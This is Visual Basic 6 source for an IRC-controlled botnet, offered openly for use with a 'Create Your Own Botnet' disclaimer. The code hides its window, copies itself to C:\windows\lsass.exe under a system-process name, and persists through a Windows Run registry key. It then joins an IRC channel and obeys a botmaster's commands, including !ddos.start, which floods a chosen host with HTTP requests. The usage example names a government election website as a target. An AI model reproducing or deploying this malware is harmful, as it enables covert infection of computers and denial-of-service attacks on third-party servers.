VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Xcode 
   BorderStyle     =   0  'None
   Caption         =   "poni - XCode/Yogyafree/Yogya Family Code"
   ClientHeight    =   2340
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3570
   LinkTopic       =   "Form1"
   ScaleHeight     =   2340
   ScaleWidth      =   3570
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtkomponenwinsock 
      Height          =   285
      Left            =   240
      TabIndex        =   3
      Text            =   "MSWINSCK.OCX"
      Top             =   1920
      Width           =   1695
   End
   Begin VB.Timer timerinfeksi 
      Interval        =   1000
      Left            =   3000
      Top             =   1800
   End
   Begin VB.TextBox statusdos 
      Height          =   285
      Left            =   240
      TabIndex        =   2
      Text            =   "IDLE"
      Top             =   1560
      Width           =   1695
   End
   Begin VB.TextBox ipport 
      Height          =   285
      Left            =   240
      TabIndex        =   1
      Top             =   1080
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock sockddos 
      Left            =   2040
      Top             =   1800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer timerddos 
      Enabled         =   0   'False
      Interval        =   400
      Left            =   2520
      Top             =   1800
   End
   Begin VB.TextBox ip 
      Height          =   285
      Left            =   240
      TabIndex        =   0
      Top             =   720
      Width           =   1695
   End
   Begin VB.Timer timerrekonek 
      Enabled         =   0   'False
      Interval        =   4000
      Left            =   720
      Top             =   240
   End
   Begin MSWinsockLib.Winsock WinSockIRC 
      Left            =   240
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Xcode"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Title      : Xcode Botnet - "unl34sh3d YouR 0wN C0mputa Z0m813"
'Desc       : Botnet
'Progammer  : poni - Xcode/Yogyafree/Yogya Family Code - Software Development Team
'site       : You Know Who We Are
'Disclaimer : Create Your Own Botnet, Use it As Your Own Risk
'USAGE      : !ddos.start  <site> <port> example: !ddos.start www.kpu.go.id 80
'             !ddos.status
'             !ddos.stop
'             !url         <site>        example: !url www.kpu.go.id
'             !join        <channel>     example: !join #Xcode
'             !part        <channel>     example: !part #Xcode
'             !version

Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Const Server As String = "irc.dal.net"  'server irc
Const port As Integer = "6667"          'Port
Const Channel As String = "#H.A.C.K"   'Channel untuk mengontrol Zombie
Const Master As String = "poni"        'Botmaster
Const Versi As String = "XCode-Yogyafree botnet. Open Edition  auth:poni"  'Versi bot
Dim DataGetWsc As String

Private Sub Form_Load()
    WinSockIRC.Connect Server, port
    timerrekonek.Enabled = True
    Me.Hide
    App.TaskVisible = False
    infeksi
    End Sub

Private Sub Form_Unload(Cancel As Integer)
If WinSockIRC.State = sckConnected Then
 WinSockIRC.Close
 End If
End Sub

Function connected() As Boolean
    If WinSockIRC.State = sckConnected Then
        connected = True
        Else
        connected = False
    End If
End Function

Private Sub timerinfeksi_Timer()
 timerinfeksi.Enabled = False
   If Second(Now) Mod 100 = 0 Then Call infeksi
 timerinfeksi.Enabled = True
End Sub

Private Sub timerrekonek_Timer()
If Not (connected) Then
       WinSockIRC.Close
      Call Form_Load
    End If
    Exit Sub
End Sub

Private Sub WinSockIRC_Connect()
nick = "C3we_" + modcomputername.ComputerName() + "_Mesin" + "^" & LTrim(RTrim(Str(Int(Rnd * 1000)))) & "^"

WinSockIRC.SendData "NICK " + nick & vbCrLf
WinSockIRC.SendData "USER " & nick & " " & WinSockIRC.LocalIP & " Coba : Cobacoba" & vbCrLf
WinSockIRC.SendData "JOIN " & Channel & " " & vbCrLf
WinSockIRC.SendData "JOIN #H.A.C.K " & vbCrLf
End Sub

Private Sub WinSockIRC_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim Data As String
Dim i As Integer
Dim Downloaded As Boolean
Dim WRD() As String
Dim CMD64 As String
Dim VCMD() As String

WinSockIRC.GetData Data, vbString
DataGetWsc = Data
DoEvents


If InStr(Data, "PING") Then
 WinSockIRC.SendData Replace(Data, "PING", "PONG") & vbCrLf
 ActiveDos = 1
End If

If InStr(Data, ":!") Then
 VCMD = Split(Data, ":!")
 CMD64 = VCMD(1)
 WRD() = Split(CMD64, " ")
End If

If InStr(VCMD(0), ":" & Master & "!") Then

'--Perintah DDOS---'
 If InStr(CMD64, "ddos.start") Then
  If statusdos = "AKTIF" Then
   WinSockIRC.SendData "PRIVMSG " & Channel & " :DDOS Status: Hanya bisa DDOS pada satu target." & vbCrLf
  Else
   If WRD(1) = "" Then
    WinSockIRC.SendData "PRIVMSG " & Channel & " :DDOS Penggunaan: !ddos.start ip port" & vbCrLf
   ElseIf WRD(2) = "" Then
    WinSockIRC.SendData "PRIVMSG " & Channel & " :DDOS Penggunaan: !ddos.start ip port" & vbCrLf
   Else
   ip.Text = WRD(1)
   ipport.Text = WRD(2)
   Call mulai_tembak
             End If
  End If
 End If

 If InStr(CMD64, "ddos.status") Then
  If statusdos.Text = "IDLE" Then
   WinSockIRC.SendData "PRIVMSG " & Channel & " :DDOS Status: Idle-menunggu perintah." & vbCrLf
  Else
   WinSockIRC.SendData "PRIVMSG " & Channel & " :DDOS Status: Aktif - Target: " & ip.Text & ":" & ipport.Text & vbCrLf
  End If
 End If

 If InStr(CMD64, "ddos.stop") Then
  StopDoS
  End If


'---buka web---'
If InStr(CMD64, "url") Then
  Bukasitus WRD(1)
End If


'---melihat versi bot---'
 If InStr(CMD64, "version") Then
  WinSockIRC.SendData "PRIVMSG " & Channel & " :INFO: " & Versi & vbCrLf
 End If



'---join channel irc---'
If InStr(CMD64, "join") Then
WinSockIRC.SendData "JOIN " & WRD(1) & " " & vbCrLf
 End If

'--keluar dari channel irc---'
If InStr(CMD64, "part") Then
WinSockIRC.SendData "PART " & WRD(1) & " " & vbCrLf
End If

End If
End Sub
Private Sub mulai_tembak()
timerddos.Enabled = False
sockddos.Connect ip.Text, ipport.Text
End Sub

Private Sub sockddos_Connect()
statusdos.Text = "AKTIF"
timerddos.Enabled = True

End Sub

Private Sub timerddos_Timer()
On Error GoTo diskonek
tembak:
Dim HTTPData As String
HTTPData = "GET / HTTP/1.0" & vbNewLine & "Host: " & DIP & vbNewLine & vbNewLine
  sockddos.SendData HTTPData
  sockddos.SendData "DDOSING.YOUR.Server.poni.xcode.yogyafree!*$^%#vvfhtgfrtyrrwe54dfdwe343e2thjhgbf^&#*#H#$Y#&N$MFU*#$J%*DJ*$%JF*J$*FJ*$iiiiiiiiiiiiiiiiiii66666666666666666666666666666666666666JF*J$*FJ*$%JF*J$*J*$J*FJJFOSLKFK"
  Exit Sub
diskonek:
   sockddos.Close
   Call mulai_tembak
            Exit Sub
  
End Sub

Private Sub sockddos_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim StrX As String
DoS.GetData StrX
End Sub

Private Sub StartDoS()
timerddos.Enabled = True
End Sub

Private Sub StopDoS()
sockddos.Close
timerddos.Enabled = False
ip = " "
ipport.Text = " "
statusdos.Text = "IDLE"
End Sub

Private Sub infeksi()
On Error Resume Next
Dim nama As String
    Dim path As String
    Dim Cek As String
    
    path = App.path
    If Right(path, 1) <> "\" Then path = path & "\"
    nama = path & App.EXEName & ".exe"
    
    CopyFile nama, "C:\windows\lsass.exe", True
    CopyFile App.path & "\" & txtkomponenwinsock, "C:\windows\MSWINSCK.OCX", True
   
    Cek = AmbilString(HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "C:\windows\lsass.exe")
    If Cek = "" Then
        BuatString HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "NeroCheck", "C:\windows\lsass.exe"
    End If
End Sub




